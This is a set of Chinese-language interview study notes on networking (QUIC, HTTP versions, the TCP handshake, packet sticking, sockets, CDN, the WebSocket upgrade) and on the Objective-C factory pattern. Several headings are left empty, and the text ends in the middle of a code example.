可以把 QUIC 想象成一个“集大成者”，它将 **TCP 的可靠性**、**TLS 1.3 的加密安全性** 以及 **HTTP/2 的多路复用** 等特性融合并优化，全部打包在一个协议里。

### QUIC 的诞生动机：为什么我们需要它？

---

### QUIC 的核心特性与工作原理

#### 1. 彻底解决队头阻塞 (内置的多路复用)

这是 QUIC 最核心的优势。

*   **TCP 的问题**：所有 HTTP/2 的流（Streams）都混合在一个 TCP 连接中。一个 TCP 数据包的丢失，会导致整个 TCP 连接停顿，所有流都被阻塞。
*   **QUIC 的方案**：QUIC 将“流”作为一等公民。每个流在 QUIC 内部都是独立管理的。**一个流的数据包丢失，只会阻塞那一个流**，其他流的数据仍然可以被正常地处理和交付给上层应用。

总结：比如解析一个html，http1.1会建立多个 tcp连接，开销大。http2就利用多路复用，将所有流都在一个tcp连接传输，但是如果有一个包丢了，就会影响整个连接的传输。于是quic将可靠性这个保证下放到每个流这个单位，某个流阻塞了不影响其他流的传输。

#### 2. 大幅减少连接建立的延迟 (0-RTT & 1-RTT)

建立一个安全的 HTTPS 连接在 TCP 上通常很慢：
*   **TCP 握手**：需要1个RTT（往返时间）。
*   **TLS 握手**：需要1-2个RTT。
*   **总共**：需要2-3个RTT才能开始发送应用数据。

QUIC 将传输层握手和加密握手合并了：
*   **首次连接**：客户端和服务器通过 **1-RTT** 就可以完成握手并开始传输数据。
*   **后续连接**：如果客户端之前连接过该服务器，它可以利用缓存的密钥信息，实现 **0-RTT** 连接。这意味着客户端可以直接向服务器发送加密的应用数据，无需任何握手等待。这对移动网络等高延迟环境的体验提升是巨大的。

#### 3. 连接迁移 (Connection Migration)

这是一个对移动设备用户极其友好的特性。

*   **TCP 的问题**：一个 TCP 连接由一个四元组唯一标识：`(源IP, 源端口, 目的IP, 目的端口)`。当你手机的網絡从 Wi-Fi 切换到 4G 时，你的IP地址变了，这个四元组也就失效了，TCP 连接必须断开重连。视频通话会卡顿，文件下载会中断。
*   **QUIC 的方案**：QUIC 不使用IP地址来标识连接。它在连接建立之初，会生成一个64位的**连接ID (Connection ID)**。只要这个ID不变，无论你的IP地址和端口如何变化（从Wi-Fi切到4G，再切回来），底层的连接都**不会中断**。QUIC 会无缝地将数据包发送到新的IP地址，实现平滑的连接迁移。

#### 4. 内置的强制加密

*   **TCP 的世界**：加密是可选的（通过上层的TLS）。
*   **QUIC 的世界**：**加密是协议的内置部分，而且是强制的**。除了少数几个用于握手的包文，QUIC 的所有数据包都经过了认证加密（AEAD）。这大大提升了网络的安全性，并能有效防止中间人对协议进行篡改或干扰。

#### 5. 更灵活的拥塞控制

QUIC 的拥塞控制算法不再由操作系统内核写死。它在应用层实现，这意味着可以快速地部署和迭代新的、更先进的拥塞控制算法（如 Google 的 BBR），以适应不断变化的网络状况。

---

### QUIC 和 HTTP/3 的关系

这是一个非常重要的概念：

*   **QUIC** 是一个**传输层协议**，是 TCP 的替代品。
*   **HTTP/3** 是一个**应用层协议**，是 HTTP/2 的升级版。

它们的关系是：**HTTP/3 不再使用 TCP 作为其底层的传输协议，而是专门设计为在 QUIC 之上运行。**

所以，当你谈论 QUIC 时，你是在谈论一个新的“公路系统”（传输层）；当你谈论 HTTP/3 时，你是在谈论在这个新公路上跑的“汽车”（应用层）。

### 总结

| 特性         | TCP + TLS (用于 HTTP/2)         | QUIC (用于 HTTP/3)           | 优势                          |
| :----------- | :------------------------------ | :--------------------------- | :---------------------------- |
| **底层协议** | TCP                             | UDP                          | 绕过TCP的限制，自由实现新特性 |
| **连接建立** | 2-3 RTT                         | **0-1 RTT**                  | 连接延迟极低                  |
| **队头阻塞** | TCP层存在，一个包丢失阻塞所有流 | **已解决**，流之间完全独立   | 提升了多路复用下的传输效率    |
| **连接迁移** | 不支持，IP改变需重连            | **支持** (通过Connection ID) | 移动网络体验无缝切换          |
| **加密**     | 由上层TLS实现，可选             | **内置且强制** (基于TLS 1.3) | 安全性更高，防篡改            |
| **拥塞控制** | 在内核中实现，更新慢            | 在应用层实现，可快速迭代     | 更灵活、更先进                |

## HTTP1.1 -> HTTP2.0 -> HTTP3.0

HTTP/1.1 相比 HTTP/1.0 性能上的改进：

- **长连接**：使用长连接的方式改善了 **HTTP/1.0 短连接**造成的性能开销，不用每次请求都tcp**握手挥手**。
- **管道网络传输**：（HTTP1.0 :完全串行执行，后一个请求必须在前一个响应之后发送。）请求可以并行发出，但是响应必须串行返回。
- 但1.1仍然有其缺点**-队头阻塞**，虽然一次可以发送多个请求，但是服务端响应的顺序只能根据请求顺序响应，如果第一个请求的处理非常耗时，后续的响应即使已经准备好也无法发送。
- 假设客户端通过一个 HTTP/1.1 连接连续发送了请求 A、请求 B 和请求 C。

  1. 服务器接收到请求 A，开始处理。
  2. 服务器接收到请求 B，将其放入队列等待。
  3. 服务器接收到请求 C，将其放入队列等待。

  如果请求 A 的处理时间很长，或者服务器在处理请求 A 时遇到网络问题（比如服务器需要等待某个后端服务），那么**即使请求 B 和请求 C 已经准备好可以被处理和响应，它们也必须等待请求 A 完成并发送响应之后才能被处理**。这就好比一个队伍，第一个人堵住了，后面的人即使没事也无法前进。

HTTP/2 协议

* **头部压缩** ：如果你同时发出多个请求，他们的头是一样的或是相似的，协议会帮你**消除重复的部分**。
* HTTP/2 不再像 HTTP/1.1 里的纯文本形式的报文，而是全面采用了**二进制格式**.
* **多路复用**:HTTP/2 允许多个请求和响应在同一个 TCP 连接上**并发**地进行, 客户端可以同时发送多个请求的帧，服务器也可以同时发送多个响应的帧，而**不必按照先进先出的顺序**。接收端会根据帧中的流 ID 将属于同一个请求或响应的帧重新组装成完整的 HTTP 报文。

假设一个网页需要加载三个资源：HTML 文件 (Stream 1)、CSS 文件 (Stream 2) 和一张图片 (Stream 3)。

- **HTTP/1.1:** 浏览器通常会发起多个串行请求（受浏览器对同一域名并发连接数的限制）。如果 HTML 文件的响应很大或者服务器处理较慢，CSS 和图片即使服务器已经准备好也必须等待 HTML 文件完全下载完毕后才能开始传输（在同一个连接内）。
- **HTTP/2:** 浏览器会为这三个资源创建三个独立的流 (Stream 1, 2, 3)，并通过同一个 TCP 连接并发地发送请求帧。服务器可以并行地处理这三个请求，并将它们的响应分解成帧，并带有相应的流 ID，然后交错地在同一个 TCP 连接上发送这些帧。浏览器接收到这些帧后，会根据流 ID 将它们重新组装成完整的 HTML、CSS 和图片，而不会因为其中一个资源的传输缓慢而阻塞其他资源的传输。

* **服务器主动推送资源**：客户端在访问 HTML 时，服务器可以直接主动推送客户端可能需要的资源。

## HTTPS加密,对称加密和非对称,为什么不只用其中一个呢?

## 什么是 TCP ？

## ？TCP的数据校验方式

## ？有哪些非对称加密算法， 有哪些对称加密算法

## 三次握手主要交换什么信息

这个问题问得非常好，直击了三次握手最核心的本质！很多人知道三次握手的过程，但对其“交换了什么信息”的理解不够深刻。

简单来说，三次握手主要交换了**两类核心信息**：

1.  **能力与状态的同步 (Synchronization of State)**: 双方确认彼此都“在线”且“有能力”进行通信。
2.  **初始序列号的交换 (Initial Sequence Number Exchange)**: 这是保证后续数据传输可靠性的基石。

我们来详细分解这“一手、二手、三手”分别交换了什么，以及这些信息为什么至关重要。

---

### **第一次握手 (客户端 -> 服务器)**

*   **发送方**: 客户端
*   **TCP 报文**: `SYN=1, seq=x`
*   **交换的信息**:
    1.  **连接意图**: 通过将 `SYN` 标志位置为1，客户端明确地告诉服务器：“**你好，我想和你建立一个连接。**” 这是最基本的意图表达。
    2.  **客户端的初始序列号 (ISN - Initial Sequence Number)**: 客户端随机选择一个初始序列号 `x`，并放在 `seq` 字段中。它告诉服务器：“**我这边的数据流，将从编号 `x` 开始计算。**”

*   **为什么需要交换这个信息？**
    *   `SYN` 是建立连接的“敲门砖”，没有它一切无从谈起。
    *   初始序列号 `x` 是后续所有数据可靠传输的起点。服务器需要知道这个起点，才能正确地确认收到了客户端的数据。

---

### **第二次握手 (服务器 -> 客户端)**

*   **发送方**: 服务器
*   **TCP 报文**: `SYN=1, ACK=1, seq=y, ack=x+1`
*   **交换的信息 (这是信息量最大的一次握手)**:
    1.  **同意连接的确认**: 通过将 `ACK` 标志位置为1，并设置 `ack=x+1`，服务器告诉客户端：“**我收到了你的连接请求（`SYN`），也收到了你的初始序列号 `x`。我期望你下一个发给我的数据，应该是从编号 `x+1` 开始。**” 这是对第一次握手的**确认**。
    2.  **服务器的连接意图**: 服务器也将 `SYN` 标志位置为1，这表示：“**我也同意建立连接，并且我也有话要说。**”
    3.  **服务器的初始序列号**: 服务器同样随机选择一个自己的初始序列号 `y`，放在 `seq` 字段中。它告诉客户端：“**我这边的数据流，将从编号 `y` 开始计算。**”

*   **为什么需要交换这个信息？**
    *   **确认客户端的发送能力**: `ack=x+1` 的发送，证明了服务器成功收到了客户端的 `SYN` 包。客户端收到这个 `ack` 后，就知道自己的发送通道是通畅的。
    *   **同步服务器的初始序列号**: 客户端必须知道服务器的初始序列号 `y`，这样它才能在后续通信中，正确地确认收到了来自服务器的数据。
    *   **确认服务器的接收能力**: `SYN=1` 的发送，本身也向客户端表明，服务器是“活着的”，并且有能力接收和处理请求。

---

### **第三次握手 (客户端 -> 服务器)**

*   **发送方**: 客户端
*   **TCP 报文**: `ACK=1, ack=y+1`
*   **交换的信息**:
    1.  **对服务器同意连接的最终确认**: 客户端将 `ACK` 标志位置为1，并设置 `ack=y+1`。它告诉服务器：“**我收到了你的同意连接信号（`SYN`），也收到了你的初始序列号 `y`。我确认收到了，我们现在可以正式开始通信了。**” 这是对第二次握手的**确认**。

*   **为什么需要交换这个信息？**
    *   **确认客户端的接收能力**: 客户端能发出这个包，说明它成功收到了服务器的 `SYN-ACK` 包。服务器收到这个最终的 `ACK` 后，就知道客户端的接收通道也是通畅的。
    *   **防止失效的连接请求 (核心)**: 这是三次握手最关键的功能。它向服务器证明，客户端**当前确实是处于想要建立连接的状态**。如果这是一个早已失效的、旧的连接请求导致的服务器响应，客户端会因为状态不匹配而不会发送这个最终的 `ACK`，从而避免了服务器空耗资源。

##  ？HTTP协议流程

## TCP 四次挥手过程是怎样的？

## 为什么要等待2MSL？

如果服务端没有接收到客户端最后的ack，就会重发fin报文，这个时候为了正确关闭服务端的连接，所以客户端要等一下可能还存在的fin报文，2MSL是允许报文丢一次的时间。

## 为什么挥手要四次

## ？TCP关闭连接后操作系统需要释放哪些资源？

## 为什么tcp一开始要慢启动，不以最大能力传输

## UDP如何实现可靠连接?

## quic协议

* http3的协议，利用udp实现
* 更快的握手，tls握手和tcp握手一起完成
* 解决了队头阻塞， TCP 的可靠传输是基于字节流的。如果数据包丢失，后续的所有数据包都必须等待，导致整个连接被阻塞。这在 HTTP/2 的多路复用中尤为明显，一个丢失的数据包会阻塞所有请求。
* 不再使用ip+端口号来确认一个唯一的tcp连接，而是使用一个64位的id

## 粘包问题知道吗?TCP和UDP都会有粘包问题吗?怎么解决

### **TCP和UDP都会有粘包问题吗？**

这是一个关键的区别点。

#### **TCP：有“粘包”问题**

*   **原因：** TCP是**面向连接的、可靠的、字节流**协议。
    *   **字节流 (Byte Stream):** 这就是根本原因。在TCP看来，它传输的数据就像上面例子里的水流，是一串没有边界、连续的字节序列。它**不保留**发送方应用层调用 `send()` 的次数和边界。
    *   **可靠性与效率优化：** TCP为了提高传输效率，内部有很多优化机制，这些机制会加剧“粘包”现象：
        1.  **Nagle算法：** TCP会把多个小的发送数据包“攒”在一起，凑成一个大的数据包再发送出去，以减少网络上的报文数量。这在**发送端**就主动制造了“粘包”。
        2.  **接收滑动窗口：** 接收方将收到的数据先放入TCP的接收缓冲区。如果上层应用（你的程序）没有及时来读取，多个数据包就会在缓冲区里排队，等待被一起读走。这在**接收端**也促进了“粘包”。

*   **结论：** **TCP协议一定会产生“粘包”和“半包”问题**，这是其“字节流”特性的必然结果。应用程序**必须**自己处理这个问题。

#### **UDP：没有“粘包”问题**

*   **原因：** UDP是**无连接的、不可靠的、数据报**协议。
    *   **数据报 (Datagram):** 这是根本原因。UDP把应用层交给它的每一块数据，都视为一个**独立、完整、有边界**的消息单元，称为“数据报”。
    *   **无复杂优化：** UDP没有像Nagle算法那样的优化。应用层调用一次 `sendto()`，UDP协议就老老实实地把它打包成一个UDP数据报发送出去。
    *   **保留消息边界：** 接收方的UDP协议栈在收到一个数据报后，会把它**完整地**交给上层应用。接收方调用一次 `recvfrom()`，就正好能读出一个完整的、发送方发送时的数据报。**发送和接收的次数是一一对应的**。

*   **结论：** **UDP协议天然地保留了消息的边界，因此它不存在“粘包”问题。** 但是，它有其他问题：
    1.  **丢包：** UDP数据报可能会丢失。
    2.  **乱序：** 后发的数据报可能先到。
    3.  **包大小限制：** UDP数据报的大小受限于MTU（通常约1500字节），如果应用层数据过大，发送时可能会失败，或者需要应用层自己进行分包和重组。

---

### **如何解决TCP的粘包问题？**

#### **3. 消息头 + 消息体 (最常用、最通用的方案)**

http方案，消息头里面有content-length 标记了消息体的长度 ，然后消息头和消息体之间有一个空行 （\r\n）

## Socket是什么

### 1. “Socket 就是一套 API”

您说的没错。Socket 的核心就是一套**操作系统提供给应用程序的编程接口（API）**。

它就像是应用程序和操作系统内核网络协议栈之间的一个“**约定**”或“**合同**”。这个合同规定了：

*   **应用程序需要做什么**：调用 `socket()`, `bind()`, `connect()`, `send()` 这些函数。
*   **操作系统承诺做什么**：当应用程序调用这些函数时，操作系统内核会负责完成所有底下肮脏、复杂的工作（比如打包、寻址、路由、保证可靠性等）。

这套API让程序员能够以一种标准化的方式来使用网络功能，而不用去关心底层用的是什么网卡、什么路由器，或者数据在光纤里到底是怎么传输的。

### 2. “`connect` 方法就是封装了三次握手”

这个比喻非常恰当。这完美地体现了“封装”的意义。

*   **从程序员的视角看**：
    我只需要调用一个简单的函数 `connect(socket_fd, &server_addr, sizeof(server_addr))`。这是一个**同步的、单一的动作**。在程序员看来，这个函数要么成功返回（连接建立），要么失败返回（连接失败）。

*   **在操作系统（TCP协议栈）的视角看**：
    这是一个**异步的、复杂的过程**：
    1.  **客户端**：创建一个TCP报文，将`SYN`标志位置1，并附上一个初始序列号（ISN），然后发送给服务器。进入`SYN_SENT`状态。
    2.  **服务器**：接收到SYN报文后，回复一个TCP报文，将`SYN`和`ACK`标志位都置1，并附上自己的ISN和对客户端ISN的确认号。进入`SYN_RCVD`状态。
    3.  **客户端**：接收到服务器的SYN-ACK报文后，再发送一个`ACK`报文给服务器进行最终确认。进入`ESTABLISHED`状态。
    4.  **服务器**：接收到最终的ACK后，也进入`ESTABLISHED`状态。

程序员调用`connect()`的那一刻，操作系统就在底层默默地完成了以上所有步骤，包括可能发生的**超时重传**。程序员完全不需要关心这些状态的转换和细节。

### 3. “`send` 方法只需要传数据，不关心报文格式的封装”

是的，这正是封装的魅力所在。

*   **从程序员的视角看**：
    我有一个字符串 "Hello, World!"。我把它看作一个**连续的字节流**，然后调用 `send(socket_fd, "Hello, World!", 13, 0)`。我只关心把这串字节“扔”进Socket里。

*   **在操作系统（TCP/IP协议栈）的视角看**：
    它接到这13个字节的数据后，会进行一系列复杂的“**打包**”工作：
    1.  **TCP层**：首先，TCP会根据MSS（最大报文段长度）把数据切割成合适的块。然后给每一块数据加上一个**TCP头部**，里面包含了源/目的端口号、序列号、确认号、校验和等信息。这个“TCP头 + 数据”被称为一个**TCP报文段（Segment）**。
    2.  **IP层**：TCP层把报文段交给IP层。IP层再给它加上一个**IP头部**，里面包含了源/目的IP地址等信息。这个“IP头 + TCP报文段”被称为一个**IP数据报（Datagram）**。
    3.  **数据链路层**：IP层再把数据报交给下一层，可能会被加上MAC地址等头部信息，成为一个**帧（Frame）**，最终在物理媒介上传输。

程序员通过一个简单的`send`调用，触发了底层协议栈精密的、层层的封装流程。我们完全不需要手动去拼接这些报文头部。

---

### CDN是什么

好的，这是一个在面试中出现频率极高的问题，因为它不仅考察你的基础知识，还能延伸到性能优化、网络架构等多个方面。

一个理想的回答应该像剥洋葱一样，从**核心定义**，到**工作原理**，再到**带来的好处**，最后能结合**实际场景**。

---

### 一个理想的面试回答结构

#### **第一部分：一句话定义 (告诉面试官你抓住了核心)**

> “CDN，全称是Content Delivery Network，内容分发网络。它本质上是一个**构建在现有互联网之上的、分布式的智能缓存系统**。它的核心目标是**解决用户访问延迟的问题**，让用户可以**就近获取**所需内容，从而提高访问速度和稳定性。”

*(这个定义包含了几个关键词：分布式、缓存系统、就近获取、提高速度和稳定性。)*

---

### **第二部分：工作原理 (用一个生动的比喻+技术解释)**

> “要理解CDN的工作原理，我们可以把它想象成一个**覆盖全国的连锁仓库系统**，比如京东物流。”
>
> **1. 没有CDN的情况：**
> “假设我们的网站服务器（源站）在北京，就像一个**总仓库**。那么一个深圳的用户下单买东西（发起HTTP请求），货物必须从北京的总仓库发出，经过漫长的公路运输（互联网链路），才能送到深圳用户手里。这个过程不仅慢，而且中间任何一个环节堵车（网络拥堵），都会导致更长的延迟。”
>
> **2. 有了CDN之后：**
> “有了CDN，就相当于京东在全国各地，包括深圳，都建立了很多**前置仓（这就是CDN节点）**。CDN会提前把北京总仓库里的热门商品（网站的热门静态资源，如图片、视频、JS文件等）**缓存**到这些前置仓里。”
>
> **3. 核心的“智能调度”——DNS：**
> “那么，当深圳用户再次下单（访问网站）时，神奇的事情发生了：”
>
> 1.  “用户的访问请求，第一步不是直接去北京，而是先去问一个叫**DNS（域名系统）**的‘智能客服’。这个DNS系统已经被CDN“改造”过了，它不仅仅是把域名翻译成IP地址。”
> 2.  “这个智能的DNS客服会分析这个请求来自哪里（比如通过用户的IP地址，知道他来自深圳），然后**不再返回北京总仓库的地址**。”
> 3.  “取而代之，它会返回离用户**最近、最快、最不拥挤**的那个**深圳前置仓（CDN节点）的IP地址**。”
> 4.  “于是，用户的浏览器就直接去访问这个深圳的CDN节点了。因为是同城访问，速度极快，用户几乎立刻就拿到了他想要的图片或视频。”
>
> **总结一下技术流程就是：**
> **用户请求 -> 智能DNS解析 -> 定位到最优的CDN边缘节点 -> 如果节点有缓存，直接返回给用户；如果没缓存，节点会去源站请求数据，缓存下来再返回给用户。**

*(这部分用比喻把复杂的技术讲得通俗易懂，然后又回归到技术流程，展示了你的理解深度和表达能力。)*

---

### **第三部分：CDN带来的核心价值 (展示你的业务思考)**

> “使用CDN能带来几个非常关键的好处：”
>
> 1.  **用户体验的极大提升**：这是最直接的价值。通过就近访问，网站的加载速度会得到质的飞跃，尤其对于图片、视频等大文件，效果极其明显。这直接关系到用户留存率。
>
> 2.  **减轻源站服务器的压力**：大部分的用户请求（通常能达到80%-95%）都被分布在全国各地的CDN节点给“挡”住了，只有少量请求（比如缓存未命中或动态内容）会真正到达我们的源站服务器。这大大降低了源站的带宽成本和服务器负载，使其能更专注于处理核心的业务逻辑。
>
> 3.  **提升网站的可用性和稳定性**：CDN节点是分布式的，并且有冗余。如果某个节点出现故障，DNS系统会自动将用户的请求调度到其他健康的节点上。甚至在源站出现短暂故障时，只要CDN节点有缓存，用户依然可以正常访问网站的部分内容，起到了一个“缓冲层”的作用。
>
> 4.  **一定的安全防护**：很多CDN服务商都集成了基础的DDoS攻击防护、WAF（Web应用防火墙）等功能，可以帮助抵御一些常见的网络攻击。

---

### **面试时如何回答这个问题？**

你可以这样来组织你的回答，体现出你对直播技术的深度理解。

**第一步：先给出明确的肯定答案，并点出核心区别。**

> “是的，直播服务不仅可以用CDN，而且CDN是支撑大规模、低延迟、高并发直播业务的**绝对核心基础设施**。不过，它和我们通常说的用于网站静态资源（如图片、视频点播文件）的CDN工作方式不太一样。静态资源CDN的核心是**‘缓存’**，而直播CDN的核心是**‘分发’和‘转发’**。”

*(这个开场白直接展现了你的洞察力，你知道关键区别在于“缓存” vs “转发”。)*

---

### **第二步：解释为什么直播不能简单地“缓存”。**

> “您刚才说的非常对，‘直播画面不都是一个个流吗？’，这正是问题的关键。直播的特点是**实时性**。数据流是持续不断产生的，而且用户希望看到的是**几乎没有延迟**的画面。如果我们像缓存图片一样，等一个文件（比如一段10秒的视频切片）完全下载到CDN节点再提供给用户，那延迟就太大了，直播就变成了‘慢播’。”



## 为什么说http是无状态的？

在 Web 交互中，这意味着：

1. **每个请求都是独立的**：当你在浏览器上发起一个 HTTP 请求（比如点击一个链接），服务器处理完这个请求并返回响应后，它就**完全忘记**了这次交互。
2. **服务器不保留客户端信息**：服务器不会主动记录是谁在访问它，也不会保留该客户端之前的操作历史。
3. **后续请求必须提供所有信息**：如果你需要进行一系列相关的操作（比如登录、添加到购物车、结算），那么你的**每一次**请求都必须重新告诉服务器“我是谁”以及所有必要的信息。服务器不会因为你上一步刚刚登录过，就“记住”你已经登录了。

### 三、为什么 HTTP 被设计成无状态的？

将核心协议设计成无状态，是出于非常重要的工程考量，带来了巨大的好处：

1. **简化服务器设计**：
   - 服务器不需要花费额外的资源（内存、CPU）来存储和维护海量的客户端状态信息。想象一下，如果一个像 Google 或 Facebook 这样的服务器需要记住全球数十亿用户每个人的当前操作状态，那将是一个巨大的负担。
   - 无状态使得服务器可以更专注于处理当前请求的业务逻辑，职责单一。
2. **增强可伸缩性（Scalability）**：
   - 这是最重要的优点。因为服务器不保存状态，所以任何一个客户端的请求都可以被**任意一台服务器**处理。
   - 这使得构建大型服务器集群和进行**负载均衡（Load Balancing）**变得非常容易。一个请求来了，负载均衡器可以随便把它分发给集群中任何一台空闲的服务器，而不用担心这台服务器是否“认识”这个客户端。这极大地提高了网站的并发处理能力和可靠性。
3. **提高可靠性（Robustness）**：
   - 如果一台服务器宕机了，客户端的下一个请求可以无缝地被另一台服务器接管，因为新的服务器不需要从宕机的服务器那里同步任何状态信息，它只需要根据请求本身包含的信息来处理即可。

### 四、既然无状态，那如何实现有状态的应用（如购物车、登录）？

这是一个关键问题。HTTP 协议本身是无状态的，但现实中的 Web 应用几乎全都是有状态的。我们是通过在**无状态的协议之上构建有状态的会话机制**来解决这个问题的。

这就好像我们虽然知道金鱼记不住事，但我们发明了一种方法来和它“有效”沟通：**每次都给它看一张写着我们身份和历史的卡片**。

常见的实现方式有：

1. **Cookie**：
   - 这是最经典、最常用的方式。
   - **流程**：
     1. 用户第一次登录成功后，服务器会生成一个唯一标识（Session ID），并通过响应头（Set-Cookie）把它发送给浏览器。
     2. 浏览器会自动保存这个 Cookie。
     3. 在后续的每一次请求中，浏览器都会**自动**地把这个 Cookie 放在请求头里一起发送给服务器。
   - 服务器每次收到请求，就检查请求头中的 Cookie，通过这个唯一标识就能从自己的数据库或缓存中查到该用户的会话信息（如登录状态、购物车内容等），从而实现了“记住”用户的效果。
2. **Session**：
   - Session 是一种服务器端的机制，它需要与 Cookie 配合。服务器为每个用户创建一个 Session 对象来存储状态信息，而 Cookie 中只存放这个 Session 的唯一ID。
3. **Token（如 JWT - JSON Web Tokens）**：
   - 在现代 Web 应用（特别是前后端分离的 SPA 和移动应用）中非常流行。
   - 服务器在用户认证成功后，会生成一个加密的 Token（令牌）返给客户端。这个 Token 本身就包含了用户的身份信息（以及可能的权限、过期时间等）。
   - 客户端在后续请求中，通常会在请求头（Authorization 字段）中携带这个 Token。服务器收到后，只需验证 Token 的签名是否有效，即可确认用户身份，无需再去查询数据库。

## 在浏览网页时，http如何升级成websocket的

---

### 二、技术核心：升级握手 (The Upgrade Handshake)

这个“升级”的过程，本质上是一个 cleverly-designed 的 HTTP 请求和响应。它利用了 HTTP 协议自身的一个特性，即协议升级机制。

#### 第1步：客户端发起“升级”请求

这一切始于一个由客户端（通常是浏览器中的 JavaScript）发起的、看起来很普通的 HTTP GET 请求。但它的“魔力”在于包含了几个特殊的 **HTTP 头信息 (Headers)**。

```http
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://example.com
```

我们来解读这几个关键的“魔法”头信息：

*   `Upgrade: websocket`: 这是最明确的信号。客户端直截了当地告诉服务器：“我不想只做一次普通的HTTP通信，我想把这条连接升级成 WebSocket 协议。”
*   `Connection: Upgrade`: 这是一个标准的 HTTP/1.1 头，它告诉网络中的任何代理或服务器，这次连接的性质即将改变，不要在这次请求后就关闭它。
*   `Sec-WebSocket-Key`: 这是为了安全起见的一个**一次性随机密钥**。客户端会生成一个随机的、经过 Base64 编码的字符串。它的作用不是加密，而是为了确保服务器是一个真正懂 WebSocket 协议的服务器，而不是一个老的、不支持此协议的 HTTP 服务器。
*   `Sec-WebSocket-Version: 13`: 指定了客户端期望使用的 WebSocket 协议版本，目前 13 是最广泛使用的标准版本。

#### 第2步：服务器响应“升级”请求

如果服务器理解并同意这个升级请求，它会返回一个非常特殊的 HTTP 响应。这个响应的状态码不是我们常见的 `200 OK`。

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

解读关键的响应信息：

*   `HTTP/1.1 101 Switching Protocols`: 这个状态码是整个握手的核心。它明确地告诉客户端：“我同意你的请求，我们现在正式**切换协议**！”
*   `Upgrade: websocket` 和 `Connection: Upgrade`: 服务器会原样返回这两个头，确认它理解并同意了客户端的升级提议。
*   `Sec-WebSocket-Accept`: 这是服务器对客户端 `Sec-WebSocket-Key` 的一个**数学响应**，也是安全验证的关键。服务器会执行以下计算：
    1.  取客户端发来的 `Sec-WebSocket-Key` 的值。
    2.  将这个值与一个固定的、在 WebSocket 协议规范中定义的“魔法字符串” (`258EAFA5-E914-47DA-95CA-C5AB0DC85B11`) 拼接起来。
    3.  计算拼接后字符串的 **SHA-1 哈希值**。
    4.  将这个二进制的哈希值进行 **Base64 编码**。
    5.  将最终的结果作为 `Sec-WebSocket-Accept` 头的值返回。

客户端收到这个响应后，会用同样的方式进行一次计算，如果自己计算出的结果和服务器返回的 `Sec-WebSocket-Accept` 值完全一致，客户端就知道，对方确实是一个合法的、支持 WebSocket 的服务器。握手成功！

## 工厂模式

好的，工厂模式是面向对象设计中最基础、最重要，也是在 Objective-C 开发中应用最广泛的设计模式之一。理解它有助于编写出更灵活、更解耦、更易于维护的代码。

在 Objective-C 中，工厂模式主要有三种经典的变体：**简单工厂模式、工厂方法模式、以及抽象工厂模式**。

---

### **一、核心思想：将“创建对象”的责任封装起来**

无论哪种工厂模式，它们的核心思想都是一样的：

> **将对象的创建过程（`[[ClassName alloc] init]`）从使用它的地方（客户端代码）中隔离出来，封装到一个专门负责创建的“工厂”里。客户端不再直接依赖于具体的类，而是向工厂请求一个对象。**

**这样做的好处是什么？**
*   **解耦 (Decoupling)**: 客户端代码只知道它需要一个“产品”（比如一个 `UIView`），但它不需要知道这个产品具体是哪个子类（`RedButtonView`, `BlueButtonView`），也不需要知道创建它的复杂过程。
*   **灵活性和可扩展性**: 如果未来需要增加一个新的产品类型（比如 `GreenButtonView`），我们只需要修改工厂内部的逻辑，而**完全不需要改动任何使用这个工厂的客户端代码**。这非常符合**“对扩展开放，对修改关闭”**的开闭原则。

---

### **二、简单工厂模式 (Simple Factory Pattern)**

这是最常用、最直观的一种工厂模式，有时也被称为“静态工厂方法模式”。

*   **结构**: 通常由一个**单独的工厂类**，以及一个**静态的（类）方法**组成。这个方法根据传入的参数，来决定到底要创建并返回哪一个具体的子类实例。
*   **比喻**: 就像一个“汽水机”。你投币并按下一个按钮（**传入参数**，比如“可乐”或“雪碧”），汽水机（**工厂类**）内部就会根据你的选择，掉出一瓶对应的汽水（**具体产品实例**）。你只关心拿到汽水，不关心汽水机内部的机械构造。

**代码示例：**

假设我们要根据不同的数据类型，创建不同的 `UIView` 来展示。

1.  **定义一个产品基类 (或协议)**
    ```objc
    // BaseView.h
    @interface BaseView : UIView
    - (void)configureWithData:(NSDictionary *)data;
    @end
    ```

2.  **创建具体的产品子类**
    ```objc
    // ImageView.h, TextView.h ...
    @interface ImageView : BaseView @end
    @interface TextView : BaseView @end
    ```

3.  **创建工厂类**
    ```objc
    // ViewFactory.h
    typedef NS_ENUM(NSInteger, ViewType) {
        ViewTypeImage,
        ViewTypeTest
    };
    
    @interface ViewFactory : NSObject
    // 这就是工厂方法
    + (BaseView *)createViewWithType:(ViewType)type;
    @end
    
    // ViewFactory.m
    #import "ImageView.h"
    #import "TextView.h"
    
    @implementation ViewFactory
    + (BaseView *)createViewWithType:(ViewType)type {
        BaseView *view = nil;
        switch (type) {
            case ViewTypeImage:
                view = [[ImageView alloc] init];
                break;
            case ViewTypeTest:
                view = [[TextView alloc] init];
                break;
            // ... 如果未来有新的 View 类型，只需在这里加一个 case
        }
        return view;
    }
    @end
    ```

4.  **客户端使用**
    ```objc
    // Client code
    ViewType typeFromServer = ...; // 从服务器获取到要展示的类型
    BaseView *myView = [ViewFactory createViewWithType:typeFromServer];
    [self.view addSubview:myView];
    ```
    客户端代码完全不知道 `ImageView` 或 `TextView` 的存在。

**优点**: 简单、直观、有效。
**缺点**: 如果要增加新的产品类型，必须**修改工厂类的代码**，这在一定程度上违反了开闭原则。

---

### **三、工厂方法模式 (Factory Method Pattern)**

工厂方法模式是对简单工厂的“升级”，它更好地遵循了开闭原则。

*   **结构**: 它不再有一个全能的“中央工厂”。而是定义一个**创建对象的接口（一个方法）**，但将**具体的创建过程延迟到子类**中去实现。
*   **比喻**: 不再是一个万能的汽水机。而是有一个“饮料工厂”的**设计蓝图**（**抽象工厂类**），这个蓝图规定了所有工厂都必须有一个叫做 `produceDrink` 的车间（**工厂方法**）。
    *   “可口可乐工厂”（**具体工厂子类**）继承这个蓝图，并实现了 `produceDrink` 车间，专门用来生产可乐。
    *   “百事可乐工厂”（**另一个具体工厂子类**）也继承这个蓝图，实现了 `produceDrink` 车间，专门用来生产百事。

**代码示例：**

1.  **定义抽象工厂和工厂方法**
    ```objc
    // BaseViewFactory.h (抽象工厂)
    @interface BaseViewFactory : NSObject
